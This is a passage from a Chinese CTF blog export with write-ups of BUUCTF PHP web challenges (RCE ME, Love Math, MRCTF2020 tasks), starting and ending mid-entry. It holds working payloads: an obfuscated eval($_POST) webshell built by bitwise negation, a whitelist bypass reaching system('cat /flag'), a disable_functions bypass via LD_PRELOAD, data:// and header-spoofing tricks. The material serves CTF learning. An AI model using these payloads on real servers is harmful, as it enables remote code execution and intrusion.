<p>[php反序列化之pop链_L1ni01-CSDN博客_pop链](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP链介绍</a> POP 面向属性编程 (Property-Oriented,Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是 从现有运行环境 中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链%2C最终达到攻击者邪恶的目的)</p>
<p>经过提示知道这题和BJDCTF的ezphp很像</p>
<h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - 博客园 (cnblogs.com)</a></p>
<p>这一篇文章解释了前面闭合的问题:</p>
<p><img src="/2021/09/25/2021/buu/23/image-20210926202437436.png" alt="image-20210926202437436"></p>
<p>这样代码实际就只执行了return $arg  这一句，完成了逃逸</p>
<p><strong>PHP 的 <code>create_function()</code> 代码注入</strong></p>
<p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L’Amore (gem-love.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>bluecms</title>
    <url>/2021/11/01/2021/buu/26/</url>
    <content><![CDATA[<p>[<a href="https://www.shawroot.cc/1159.html">NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc)</a></p>
<p>bluecms：</p>
<p><a href="https://www.cnblogs.com/BOHB-yunying/p/12643510.html">bluecms v1.6 sp1 代码审计学习 - yunying - 博客园 (cnblogs.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <url>/2021/09/29/2021/buu/25/</url>
    <content><![CDATA[<p><img src="/2021/09/29/2021/buu/25/image-20210929213110592.png" alt="image-20210929213110592"></p>
<p>GET传参</p>
<p>strlen：长度不超过40</p>
<p>preg_match：匹配英文字母和数字，die NO</p>
<p>满足条件就当做php执行并且不报错</p>
<p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战 2019]RCE ME - 云千 - 博客园 (cnblogs.com)</a></p>
<p>参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">可以用异或或者取反绕过<br>异或绕过是指使用各种特殊字符的异或构造出字母和数字。取反绕过是对语句取反。<br></code></pre></td></tr></table></figure>

<p>生成查询PHP info 的payload代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p>
<p>构造完的语句进行查询：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/29/2021/buu/25/image-20210929213713432.png" alt="image-20210929213713432"></p>
<p>看一些信息:</p>
<p><img src="/2021/09/29/2021/buu/25/image-20210929213849813.png" alt="image-20210929213849813"></p>
<p>禁用的函数相当的多</p>
<p>先传木马连接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>$a=<span class="hljs-string">&#x27;assert&#x27;</span>;<br>$b=urlencode(~$a);<br><span class="hljs-keyword">echo</span> $b;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>$c=<span class="hljs-string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;<br>$d=urlencode(~$c);<br><span class="hljs-keyword">echo</span> $d;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">?code=(~<span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%8</span>D<span class="hljs-symbol">%8</span>B)(~<span class="hljs-symbol">%D7</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%89</span><span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%93</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%DB</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%B0</span><span class="hljs-symbol">%AC</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%92</span><span class="hljs-symbol">%90</span><span class="hljs-symbol">%9</span>C<span class="hljs-symbol">%97</span><span class="hljs-symbol">%8</span>A<span class="hljs-symbol">%C8</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%D6</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/29/2021/buu/25/image-20210929214111148.png" alt="image-20210929214111148"></p>
<p>连上之后发现权限过低</p>
<p><img src="/2021/09/29/2021/buu/25/image-20210929214319688.png" alt="image-20210929214319688"></p>
<p>要读取flag，需要先执行readflag,但是因为禁用了很多函数，没有办法执行命令，这时候需要绕过disable_functions.方法好像很多，有的用蚁剑的插件，有的劫持共享so，也有一些工具<br>1.这里用工具<br>地址<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），</p>
<p>2.蚁剑插件直接绕过</p>
<p><img src="/2021/09/29/2021/buu/25/image-20210929214454384.png" alt="image-20210929214454384"></p>
<p><img src="/2021/09/29/2021/buu/25/image-20210929214557378.png" alt="image-20210929214557378"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019 初赛	Love Math</title>
    <url>/2021/07/30/2021/buu/4/</url>
    <content><![CDATA[<p>​    这是一道非常好的绕过题目。</p>
<p><img src="/2021/07/30/2021/buu/4/image-20210730151757624.png" alt="image-20210730151757624"></p>
<p>附上源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    $content = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $content)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    $whitelist = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  <br>    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$content.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>分析：白名单里有些函数</p>
<h5 id="base-convert函数"><a href="#base-convert函数" class="headerlink" title="base_convert函数"></a><strong>base_convert</strong>函数<img src="/2021/07/30/2021/buu/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h5><h5 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<h5 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex() 函数"></a>dechex() 函数</h5><p>dechex() 函数把十进制数转换为十六进制数。</p>
<p>目标：执行system函数来完成查看flag的操作。</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>但是上面列出来白名单和黑名单，关键字符会被过滤，要求我们绕过。</p>
<p>比如这样就是被过滤了：</p>
<p><img src="/2021/07/30/2021/buu/4/image-20210802091253839.png" alt="image-20210802091253839"></p>
<p>我们不能输入引号和system函数</p>
<p>但引号去掉也可执行，然后再采用变量保存函数和参数。</p>
<p>且用白名单里的函数代替得</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">pi</span>])(<span class="hljs-symbol">$</span>_GET[<span class="hljs-built_in">abs</span>])&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>

<p>不过，_GET并没有在白名单内,[ ]也被过滤。</p>
<p>所以</p>
<p>1.[ ]可以用{}替换</p>
<p>2._GET用hex2bin转换</p>
<p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCII到十六进制| 文本到十六进制代码转换器 (rapidtables.org)</a></p>
<p><img src="/2021/07/30/2021/buu/4/image-20210802092247741.png" alt="image-20210802092247741"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_GET</span>=hex<span class="hljs-number">2</span>bin(<span class="hljs-number">5</span>f <span class="hljs-number">47</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span>)<br></code></pre></td></tr></table></figure>

<p>  这里用到的hex2bin也是名单之外</p>
<p>  需要用base_convert函数转换</p>
<p>（用base_convert()函数将10进制数转化为32进制的hex2bin）</p>
<p><a href="https://tool.oschina.net/hexconvert">在线进制转换 (oschina.net)</a></p>
<p><img src="/2021/07/30/2021/buu/4/image-20210802092841841.png" alt="image-20210802092841841"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">hex2bin=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)<br></code></pre></td></tr></table></figure>

<p>数字也不能直接填</p>
<p>因为之前的正则表达式会过滤掉。</p>
<p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测</p>
<p>所以<code>5f 47 45 54</code>需要转换</p>
<p>而dechex() 函数把十进制数转换为十六进制数。</p>
<p><img src="/2021/07/30/2021/buu/4/image-20210802093324856.png" alt="image-20210802093324856"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">5f</span>474554=dechex(<span class="hljs-number">1598506324</span>)<br></code></pre></td></tr></table></figure>

<p>所以有：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_GET</span>=hex<span class="hljs-number">2</span>bin(<span class="hljs-number">5</span>f <span class="hljs-number">47</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span>)=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))<br></code></pre></td></tr></table></figure>

<p>接着将_GET存在一个变量里：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">$pi=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));<br></code></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams">c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure>

<p><img src="/2021/07/30/2021/buu/4/image-20210802094315328.png" alt="image-20210802094315328"></p>
<p>本文章参考于：(<a href="https://blog.csdn.net/missht0/article/details/113244707">https://blog.csdn.net/missht0/article/details/113244707</a>)</p>
]]></content>
      <categories>
        <category>CTF·rce</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 wirteup</title>
    <url>/2021/09/28/2021/buu/24/</url>
    <content><![CDATA[<p>​    参考了Y1ng大佬的博客：<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p>
<p>真的写得很棒，看着十分舒服，还在评论区提出一点小建议（希望不会被师傅嘲笑）</p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>这题难度不大，我卡在了编写脚本上</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928193418732.png" alt="image-20210928193418732"></p>
<p>常规源码查看</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928193507092.png" alt="image-20210928193507092"></p>
<p>这里的绕过和BJDCTF的Ezphp一段代码类似，本来以为也可以url编码绕过</p>
<p>结果上面出现了计数：%5f不能出现，因为_编码后就是%5f,所以就要求其他方法绕过了</p>
<p>_ 用 ‘  ’ 绕过，而后面的正则匹配表示匹配字符串的开头和结尾</p>
<p>在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过</p>
<p>所以payload：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">?b u p t=<span class="hljs-number">23333</span>%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/28/2021/buu/24/image-20210928194036030.png" alt="image-20210928194036030"></p>
<p>得到提示</p>
<p>去访问secrettw.php页面</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928194130440.png" alt="image-20210928194130440"></p>
<p>whoa，被挡了</p>
<p>添加Client-ip：127.0.0.1</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928194319439.png" alt="image-20210928194319439"></p>
<p>再次查看源码：</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928194351650.png" alt="image-20210928194351650"></p>
<h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>原来是和js有关的代码，</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928194516235.png" alt="image-20210928194516235"></p>
<p>提示我们posy传参Merak</p>
<p>任意赋值：Merak=1</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928194610158.png" alt="image-20210928194610158"></p>
<p>好了，源码出来了</p>
<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123; <br>  $v = base64_decode($v); <br>  $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>    $re .= chr ( ord ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>  &#125; <br>  <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里可以写一个逆向的脚本来满足要求：</p>
<h4 id="逆方向脚本"><a href="#逆方向脚本" class="headerlink" title="逆方向脚本"></a>逆方向脚本</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unchange</span>(<span class="hljs-params">$v</span>)</span>&#123; <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br>$real_flag = unchange(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> base64_encode($real_flag);<br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>得到：ZmpdYSZmXGI=</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ip</span> = getIp();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-built_in">echo</span> file_get_contents(change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br></code></pre></td></tr></table></figure>

<p>ip我们已经添加了</p>
<h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><p>传入参数2333用伪协议绕过，?2333=data://text/plain,todat is a happy day</p>
<p>这里有的师傅特意用了base64绕过：data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p>
<p>file传入我们尚书脚本跑出的数据：file=ZmpdYSZmXGI=</p>
<p>到这里小心一个坑，就是不用再post传参了：</p>
<p>不然会被highlight_file函数截断</p>
<p>然后一键flag啦</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928195347754.png" alt="image-20210928195347754"></p>
<p><img src="/2021/09/28/2021/buu/24/image-20210928195408850.png" alt="image-20210928195408850"></p>
<h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h2><p>比较简单的代码审计题</p>
<p><img src="/2021/09/28/2021/buu/24/image-20210929155243165.png" alt="image-20210929155243165"></p>
<p>整理一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br>I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric($passwd))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>

<p>开头看到十分熟悉的include</p>
<p>告诉我们这个页面可以打印出和flag.php里一样的变量值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="MD5值相同的变量"><a href="#MD5值相同的变量" class="headerlink" title="MD5值相同的变量"></a>MD5值相同的变量</h4><p>第一层，要求GET传入变量gg和id，两个变量的值不同但是md5值要相同</p>
<p>自然想到数组绕过（也可以去找0e开头MD5相同的一组值）</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/28/2021/buu/24/image-20210929155726680.png" alt="image-20210929155726680"></p>
<p>看第二个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric($passwd))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br></code></pre></td></tr></table></figure>

<h4 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h4><p>这里考察了php弱类型的知识</p>
<p>当传入字符串时，==会强制转换为数字再进行比较</p>
<p>所以POST传参：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">passwd</span>=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/28/2021/buu/24/image-20210929160016795.png" alt="image-20210929160016795"></p>
<h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p><img src="/2021/09/28/2021/buu/24/image-20210929161638378.png" alt="image-20210929161638378"></p>
<p>开幕雷击，doge</p>
<p>哈哈其实是我学爬虫的视频介绍网站模板的时候就是跟这个同一家，很亲切</p>
<p>发现页面不太友好，没有任何提示</p>
